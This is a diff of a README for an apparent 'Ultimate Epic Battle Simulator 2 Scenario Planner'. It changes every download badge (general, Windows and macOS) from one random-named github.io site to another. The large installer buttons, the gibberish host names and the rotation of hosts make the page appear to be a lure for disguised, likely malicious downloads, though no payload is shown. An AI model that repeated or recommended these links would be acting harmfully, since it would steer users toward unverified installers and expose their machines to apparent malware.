@@ -30,7 +30,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Ultimate Epic Battle Simulator 2 Scenario Planner](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_ULTIMATE_EPIC_BATTLE_SIMULATOR_2_SCENARIO_PLANNER-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download Ultimate Epic Battle Simulator 2 Scenario Planner](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_ULTIMATE_EPIC_BATTLE_SIMULATOR_2_SCENARIO_PLANNER-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
 
 </div>
 
@@ -76,8 +76,8 @@ Getting started with **Ultimate Epic Battle Simulator 2 Scenario Planner** is qu
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-FF6F00?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-FF6F00?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-FF6F00?style=for-the-badge&logo=windows&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-FF6F00?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
 
 </div>
 
